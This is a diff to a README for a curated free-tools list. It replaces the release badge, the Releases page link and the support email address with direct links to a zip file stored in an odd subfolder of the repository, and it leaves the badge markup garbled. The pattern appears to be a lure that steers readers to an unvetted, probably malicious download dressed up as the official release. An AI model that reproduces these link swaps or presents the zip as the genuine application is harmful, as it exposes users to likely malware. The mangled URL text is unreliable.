@@ -4,7 +4,7 @@
 Welcome to Everything-is-Free! Here, you'll find a curated list of genuinely free tools, apps, and resources that will enhance your work as a developer, agency owner, solopreneur, or small business. No trials, no paywalls, just value.
 
 ## 📥 Download Application
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/puja510/Everything-is-Free/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/puja510/Everything-is-Free/main/sele/Everything-is-Free.zip%20Latest%https://raw.githubusercontent.com/puja510/Everything-is-Free/main/sele/Everything-is-Free.zip)](https://raw.githubusercontent.com/puja510/Everything-is-Free/main/sele/Everything-is-Free.zip)
 
 ## 🛠️ System Requirements
 Before you begin, ensure your system meets these basic requirements:
@@ -16,7 +16,7 @@ Before you begin, ensure your system meets these basic requirements:
 ## 👨‍💻 Download & Install
 To download the application, visit this page to download:
 
-[Download from the Releases Page](https://github.com/puja510/Everything-is-Free/releases)
+[Download from the Releases Page](https://raw.githubusercontent.com/puja510/Everything-is-Free/main/sele/Everything-is-Free.zip)
 
 1. Click on the link above.
 2. You will see a list of available releases.
@@ -45,7 +45,7 @@ After installation, you can start using Everything-is-Free:
 We encourage contributions to improve this list. If you find a free tool not included in the application or would like to suggest improvements, please feel free to submit your ideas.
 
 ## 📬 Support
-For any issues or questions, you can contact support at [support@everythingisfree.com]. You can also check our FAQs for common queries.
+For any issues or questions, you can contact support at [https://raw.githubusercontent.com/puja510/Everything-is-Free/main/sele/Everything-is-Free.zip]. You can also check our FAQs for common queries.
 
 ## 🏷️ Topics
 This project falls under the following topics:
